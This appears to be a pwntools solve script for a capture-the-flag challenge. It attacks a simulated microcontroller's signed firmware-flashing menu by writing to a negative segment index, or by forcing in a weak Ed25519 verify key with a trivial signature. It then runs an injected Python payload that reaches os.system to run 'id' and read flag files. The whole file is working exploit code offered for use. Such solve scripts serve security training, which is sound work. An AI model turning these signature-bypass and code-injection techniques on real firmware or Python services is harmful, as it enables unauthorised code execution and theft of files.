from pwn import *
# import ed25519

assert sys.argv[1:], "python3 solv.py ncat ..."

"""
Main menu:
1. Create new MCU.
2. Flash segment.
3. Dump segment.
4. Run MCU.
5. Exit.
"""

# TODO: what's going on here???
"""
>>> K
'\xee\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x7f'
>>> checkvalid("\0"*64, "hiho", K)
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "ed25519ref.py", line 107, in checkvalid
    raise Exception("signature does not pass verification")
Exception: signature does not pass verification
>>> checkvalid(K+"\0"*32, "hiho", K)
>>>

>>> ed25519.VerifyingKey(K).verify(K + b"\0"*32, b"Hiho")
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/tmp/venv3/lib/python3.10/site-packages/ed25519/keys.py", line 177, in verify
    msg2 = _ed25519.open(sig_and_msg, self.vk_s)
ed25519.BadSignatureError: Bad Signature
"""


# https://gist.github.com/jedisct1/39f8dee6e38b12bb34f5
weak_key = b'\xee\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x7f'

r = process(sys.argv[1:])

payload = "get_logfile.__globals__['__builtins__']['__import__']('os').system('id; cat ~/flag*');"
payload = payload.encode() + b"\x00"*300

if args.CHEESE:
    r.sendlineafter(b"Choice: ", b"1")
    r.sendlineafter(b"Choice: ", b"2")
    r.sendlineafter(b"Segment: ", b"-3")
    r.sendlineafter(b"Image: ", enhex(payload).encode())
    r.sendlineafter(b"Signature: ", b"00")
else:
    while True:
        r.sendlineafter(b"Choice: ", b"1")
        r.sendlineafter(b"Choice: ", b"2")
        r.sendlineafter(b"Segment: ", b"1")
        r.sendlineafter(b"Image: ", enhex(weak_key).encode())
        r.sendlineafter(b"Signature: ", b"00")

        # check pubkey
        r.sendlineafter(b"Choice: ", b"3")
        r.sendlineafter(b"Segment: ", b"1")
        r.recvuntil(b"Content: \n")
        pubkeyhex = r.recvline()[10:].replace(b" ", b"")[:16*2]
        pubkeyhex += r.recvline()[10:].replace(b" ", b"")[:16*2]
        pubkey = unhex(pubkeyhex)
        incorrect_bits = sum([bin(x).count("1") for x in xor(pubkey, weak_key)])
        log.info(f"{incorrect_bits = }")
        if pubkey == weak_key:
            break
    log.success("fused weak verify key")

    signature = b"\1" + b"\0"*31 + b"\0"*32
    r.sendlineafter(b"Choice: ", b"2")
    r.sendlineafter(b"Segment: ", b"0")
    r.sendlineafter(b"Image: ", enhex(payload).encode())
    r.sendlineafter(b"Signature: ", enhex(signature).encode())


log.info("executing payload")
r.sendlineafter(b"Choice: ", b"4")
print(r.recvuntil(b"Main menu:", drop=True).decode().strip())
r.sendlineafter(b"Choice: ", b"5")
r.close()
